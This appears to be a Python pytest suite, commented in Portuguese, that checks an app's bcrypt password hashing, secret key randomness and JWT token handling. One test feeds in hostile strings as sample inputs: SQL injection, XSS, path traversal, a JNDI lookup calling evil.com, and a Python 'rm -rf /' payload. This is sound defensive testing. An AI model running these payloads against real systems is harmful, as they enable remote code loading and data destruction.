import pytest
import asyncio
import hashlib
import secrets
import time
from unittest.mock import Mock, patch, MagicMock
from concurrent.futures import ThreadPoolExecutor
import threading
from datetime import datetime, timedelta

from app.core.security import (
    get_password_hash,
    verify_password,
    create_access_token,
    verify_token,
)
from app.core.config import settings


class TestPasswordHashing:
    """Testes críticos para funções de hash de senha"""

    def test_password_hash_generation(self):
        """Teste: geração de hash de senha"""
        password = "test_password_123"
        hashed = get_password_hash(password)

        # Hash deve ser diferente da senha original
        assert hashed != password
        # Hash deve ter formato bcrypt
        assert hashed.startswith("$2b$")
        # Hash deve ter comprimento adequado
        assert len(hashed) >= 60

    def test_password_verification_success(self):
        """Teste: verificação bem-sucedida de senha"""
        password = "correct_password_456"
        hashed = get_password_hash(password)

        # Verificação deve ser bem-sucedida
        assert verify_password(password, hashed) is True

    def test_password_verification_failure(self):
        """Teste: falha na verificação de senha"""
        password = "correct_password"
        wrong_password = "wrong_password"
        hashed = get_password_hash(password)

        # Verificação deve falhar
        assert verify_password(wrong_password, hashed) is False

    def test_password_hash_uniqueness(self):
        """Teste: unicidade do hash (salt)"""
        password = "same_password"

        # Gerar múltiplos hashes da mesma senha
        hashes = [get_password_hash(password) for _ in range(10)]

        # Todos os hashes devem ser únicos (devido ao salt)
        assert len(set(hashes)) == len(hashes)

    def test_password_timing_attack_resistance(self):
        """Teste: resistência a ataques de timing"""
        password = "test_password"
        hashed = get_password_hash(password)

        # Medir tempo para senha correta
        start_time = time.perf_counter()
        verify_password(password, hashed)
        correct_time = time.perf_counter() - start_time

        # Medir tempo para senha incorreta
        start_time = time.perf_counter()
        verify_password("wrong_password", hashed)
        wrong_time = time.perf_counter() - start_time

        # Diferença de tempo deve ser mínima (< 50ms)
        time_diff = abs(correct_time - wrong_time)
        assert time_diff < 0.05, f"Possível vulnerabilidade de timing: {time_diff}s"

    def test_password_edge_cases(self):
        """Teste: casos extremos de senha"""
        edge_cases = [
            "",  # Senha vazia
            " ",  # Apenas espaço
            "a" * 1000,  # Senha muito longa
            "🔐🗝️🔑",  # Emojis
            "password\x00with\x00nulls",  # Null bytes
            "password\nwith\nnewlines",  # Quebras de linha
            "password\twith\ttabs",  # Tabs
            "密码测试",  # Caracteres Unicode
        ]

        for password in edge_cases:
            try:
                hashed = get_password_hash(password)
                # Se conseguiu gerar hash, deve conseguir verificar
                assert verify_password(password, hashed) is True
            except Exception as e:
                # Se falhou, deve ser por motivo válido
                assert isinstance(e, (ValueError, TypeError))

    def test_password_injection_attempts(self):
        """Teste: tentativas de injeção em senhas"""
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "__import__('os').system('rm -rf /')",
        ]

        for malicious_password in injection_attempts:
            # Hash deve ser gerado normalmente
            hashed = get_password_hash(malicious_password)

            # Verificação deve funcionar normalmente
            assert verify_password(malicious_password, hashed) is True

            # Hash não deve conter código executável
            assert "<script>" not in hashed
            assert "DROP TABLE" not in hashed
            assert "__import__" not in hashed

    def test_bcrypt_strength(self):
        """Teste: força do algoritmo bcrypt"""
        password = "test_password"
        hashed = get_password_hash(password)

        # Deve usar bcrypt com rounds adequados (12+)
        parts = hashed.split("$")
        assert len(parts) >= 4
        assert parts[1] == "2b"  # Versão bcrypt

        rounds = int(parts[2])
        assert rounds >= 12, f"Rounds bcrypt muito baixos: {rounds}"

    def test_concurrent_hashing(self):
        """Teste: hashing concorrente"""
        password = "concurrent_test"
        num_threads = 10
        results = []

        def hash_password():
            return get_password_hash(password)

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(hash_password) for _ in range(num_threads)]
            results = [future.result() for future in futures]

        # Todos os hashes devem ser únicos
        assert len(set(results)) == len(results)

        # Todos devem ser válidos
        for hashed in results:
            assert verify_password(password, hashed) is True


class TestSecretKeyGeneration:
    """Testes para geração de chaves secretas"""

    def test_secret_key_randomness(self):
        """Teste: aleatoriedade das chaves secretas"""
        # Gerar múltiplas chaves
        keys = [secrets.token_urlsafe(32) for _ in range(100)]

        # Todas devem ser únicas
        assert len(set(keys)) == len(keys)

        # Devem ter comprimento adequado
        for key in keys:
            assert len(key) >= 32

    def test_secret_key_entropy(self):
        """Teste: entropia das chaves secretas"""
        key = secrets.token_urlsafe(32)

        # Calcular entropia básica
        char_counts = {}
        for char in key:
            char_counts[char] = char_counts.get(char, 0) + 1

        # Não deve haver repetição excessiva de caracteres
        max_repetition = max(char_counts.values())
        assert max_repetition <= len(key) // 4, "Baixa entropia na chave"

    def test_secret_key_character_set(self):
        """Teste: conjunto de caracteres das chaves"""
        key = secrets.token_urlsafe(32)

        # Deve conter apenas caracteres URL-safe
        allowed_chars = set(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        )
        key_chars = set(key)

        assert key_chars.issubset(allowed_chars), "Caracteres inválidos na chave"

    def test_secret_key_timing_consistency(self):
        """Teste: consistência de timing na geração"""
        times = []

        for _ in range(50):
            start_time = time.perf_counter()
            secrets.token_urlsafe(32)
            end_time = time.perf_counter()
            times.append(end_time - start_time)

        # Tempos devem ser consistentes (variação < 10x)
        min_time = min(times)
        max_time = max(times)

        if min_time > 0:
            ratio = max_time / min_time
            assert ratio < 10, f"Variação de timing muito alta: {ratio}x"


class TestCryptographicSecurity:
    """Testes de segurança criptográfica"""

    def test_random_salt_generation(self):
        """Teste: geração de salt aleatório"""
        password = "test_password"

        # Gerar múltiplos hashes
        hashes = [get_password_hash(password) for _ in range(20)]

        # Extrair salts dos hashes bcrypt
        salts = []
        for h in hashes:
            parts = h.split("$")
            if len(parts) >= 4:
                salts.append(parts[3][:22])  # Salt bcrypt tem 22 caracteres

        # Todos os salts devem ser únicos
        assert len(set(salts)) == len(salts), "Salts não são únicos"

    def test_cryptographic_randomness_quality(self):
        """Teste: qualidade da aleatoriedade criptográfica"""
        # Gerar dados aleatórios
        random_data = secrets.token_bytes(1000)

        # Teste básico de distribuição
        byte_counts = [0] * 256
        for byte in random_data:
            byte_counts[byte] += 1

        # Distribuição deve ser relativamente uniforme
        expected_count = len(random_data) / 256
        max_deviation = expected_count * 0.5  # 50% de desvio máximo

        for count in byte_counts:
            deviation = abs(count - expected_count)
            assert deviation <= max_deviation, "Distribuição não uniforme"

    def test_side_channel_resistance(self):
        """Teste: resistência a ataques de canal lateral"""
        password = "sensitive_password"
        hashed = get_password_hash(password)

        # Múltiplas verificações com diferentes senhas
        test_passwords = [
            password,  # Correta
            password[:-1],  # Quase correta
            password + "x",  # Quase correta
            "completely_different",  # Completamente diferente
            "",  # Vazia
        ]

        times = []
        for test_pwd in test_passwords:
            measurements = []
            for _ in range(10):
                start_time = time.perf_counter()
                verify_password(test_pwd, hashed)
                end_time = time.perf_counter()
                measurements.append(end_time - start_time)

            avg_time = sum(measurements) / len(measurements)
            times.append(avg_time)

        # Tempos devem ser similares (diferença < 20%)
        min_time = min(times)
        max_time = max(times)

        if min_time > 0:
            ratio = max_time / min_time
            assert ratio < 1.2, f"Possível vazamento de timing: {ratio}x"

    def test_memory_security(self):
        """Teste: segurança de memória"""
        import gc

        sensitive_data = "very_sensitive_password_123"

        # Processar dados sensíveis
        hashed = get_password_hash(sensitive_data)
        result = verify_password(sensitive_data, hashed)

        # Forçar garbage collection
        del sensitive_data
        gc.collect()

        # Resultado deve estar correto
        assert result is True
        assert hashed is not None

    def test_hash_collision_resistance(self):
        """Teste: resistência a colisões de hash"""
        # Gerar muitas senhas similares
        base_password = "password"
        passwords = [f"{base_password}{i}" for i in range(100)]

        hashes = [get_password_hash(pwd) for pwd in passwords]

        # Todos os hashes devem ser únicos
        assert len(set(hashes)) == len(hashes), "Possível colisão de hash detectada"

    def test_algorithm_downgrade_protection(self):
        """Teste: proteção contra downgrade de algoritmo"""
        password = "test_password"
        hashed = get_password_hash(password)

        # Hash deve usar algoritmo forte (bcrypt)
        assert hashed.startswith("$2b$"), "Algoritmo de hash inadequado"

        # Não deve aceitar hashes de algoritmos fracos
        weak_hashes = [
            hashlib.md5(password.encode()).hexdigest(),
            hashlib.sha1(password.encode()).hexdigest(),
            password,  # Senha em texto plano
        ]

        for weak_hash in weak_hashes:
            # Verificação deve falhar para hashes fracos
            result = verify_password(password, weak_hash)
            assert result is False, f"Aceitou hash fraco: {weak_hash[:20]}..."


class TestTokenSecurity:
    """Testes de segurança para tokens JWT"""

    def test_token_payload_security(self):
        """Teste: segurança do payload do token"""
        user_data = {
            "sub": "user@example.com",
            "password": "secret123",  # Não deve aparecer no token
            "secret_key": "abc123",  # Não deve aparecer no token
        }

        token = create_access_token(data={"sub": user_data["sub"]})

        # Token não deve conter dados sensíveis
        assert "password" not in token
        assert "secret123" not in token
        assert "secret_key" not in token
        assert "abc123" not in token

    def test_token_expiration_security(self):
        """Teste: segurança da expiração do token"""
        # Token com expiração muito longa (inseguro)
        long_expiry = timedelta(days=365)

        with patch("app.core.security.ACCESS_TOKEN_EXPIRE_MINUTES", 525600):  # 1 ano
            token = create_access_token(data={"sub": "test@example.com"})

            # Deve ainda ser válido (mas não recomendado)
            payload = verify_token(token)
            assert payload is not None

    def test_token_algorithm_security(self):
        """Teste: segurança do algoritmo do token"""
        token = create_access_token(data={"sub": "test@example.com"})

        # Token deve usar algoritmo seguro (HS256)
        import jwt

        # Tentar decodificar com algoritmo inseguro
        try:
            jwt.decode(token, options={"verify_signature": False, "verify_exp": False})
            header = jwt.get_unverified_header(token)

            # Deve usar algoritmo seguro
            assert header.get("alg") == "HS256", "Algoritmo JWT inseguro"
        except Exception:
            pass  # Falha esperada se token estiver bem protegido

    def test_token_secret_strength(self):
        """Teste: força da chave secreta do token"""
        # Verificar se a chave secreta é forte
        secret_key = settings.SECRET_KEY

        # Chave deve ter comprimento adequado
        assert len(secret_key) >= 32, "Chave secreta muito curta"

        # Chave deve ter boa entropia
        unique_chars = len(set(secret_key))
        assert unique_chars >= 16, "Chave secreta com baixa entropia"

    def test_token_replay_attack_protection(self):
        """Teste: proteção contra ataques de replay"""
        token = create_access_token(data={"sub": "test@example.com"})

        # Token deve ser válido inicialmente
        payload1 = verify_token(token)
        assert payload1 is not None

        # Token deve continuar válido (JWT é stateless)
        payload2 = verify_token(token)
        assert payload2 is not None

        # Payloads devem ser idênticos
        assert payload1["sub"] == payload2["sub"]

    def test_token_concurrent_verification(self):
        """Teste: verificação concorrente de tokens"""
        token = create_access_token(data={"sub": "test@example.com"})

        results = []

        def verify_token_thread():
            return verify_token(token)

        # Verificar token concorrentemente
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(verify_token_thread) for _ in range(20)]
            results = [future.result() for future in futures]

        # Todas as verificações devem ser bem-sucedidas
        assert all(result is not None for result in results)

        # Todos os payloads devem ser idênticos
        subjects = [result["sub"] for result in results if result]
        assert all(sub == "test@example.com" for sub in subjects)


class TestCryptographicEdgeCases:
    """Testes para casos extremos criptográficos"""

    def test_empty_password_handling(self):
        """Teste: tratamento de senha vazia"""
        empty_password = ""

        # Deve conseguir gerar hash para senha vazia
        hashed = get_password_hash(empty_password)
        assert hashed is not None
        assert len(hashed) > 0

        # Deve conseguir verificar senha vazia
        assert verify_password(empty_password, hashed) is True
        assert verify_password("not_empty", hashed) is False

    def test_unicode_password_handling(self):
        """Teste: tratamento de senhas Unicode"""
        unicode_passwords = [
            "café",
            "naïve",
            "北京",
            "🔐🗝️",
            "Ñoño",
            "Москва",
        ]

        for password in unicode_passwords:
            hashed = get_password_hash(password)
            assert verify_password(password, hashed) is True
            assert verify_password(password + "x", hashed) is False

    def test_very_long_password_handling(self):
        """Teste: tratamento de senhas muito longas"""
        # Senha de 10KB
        very_long_password = "a" * 10240

        # Deve conseguir processar (ou falhar graciosamente)
        try:
            hashed = get_password_hash(very_long_password)
            assert verify_password(very_long_password, hashed) is True
        except (ValueError, MemoryError) as e:
            # Falha aceitável para senhas extremamente longas
            assert "too long" in str(e).lower() or "memory" in str(e).lower()

    def test_null_byte_injection(self):
        """Teste: injeção de null bytes"""
        passwords_with_nulls = [
            "password\x00",
            "\x00password",
            "pass\x00word",
            "password\x00\x00",
        ]

        for password in passwords_with_nulls:
            hashed = get_password_hash(password)

            # Deve tratar null bytes corretamente
            assert verify_password(password, hashed) is True

            # Não deve truncar na verificação
            truncated = password.split("\x00")[0]
            if truncated != password:
                assert verify_password(truncated, hashed) is False

    def test_binary_data_handling(self):
        """Teste: tratamento de dados binários"""
        binary_passwords = [
            b"\x01\x02\x03\x04".decode("latin1"),
            b"\xff\xfe\xfd\xfc".decode("latin1"),
            bytes(range(256)).decode("latin1"),
        ]

        for password in binary_passwords:
            try:
                hashed = get_password_hash(password)
                assert verify_password(password, hashed) is True
            except (UnicodeError, ValueError):
                # Falha aceitável para dados binários inválidos
                pass

    def test_concurrent_different_passwords(self):
        """Teste: processamento concorrente de senhas diferentes"""
        passwords = [f"password_{i}" for i in range(50)]
        results = {}

        def hash_and_verify(password):
            hashed = get_password_hash(password)
            verified = verify_password(password, hashed)
            return password, hashed, verified

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(hash_and_verify, pwd) for pwd in passwords]

            for future in futures:
                password, hashed, verified = future.result()
                results[password] = (hashed, verified)

        # Todas as verificações devem ser bem-sucedidas
        for password, (hashed, verified) in results.items():
            assert verified is True
            assert hashed is not None

        # Todos os hashes devem ser únicos
        all_hashes = [hashed for hashed, _ in results.values()]
        assert len(set(all_hashes)) == len(all_hashes)
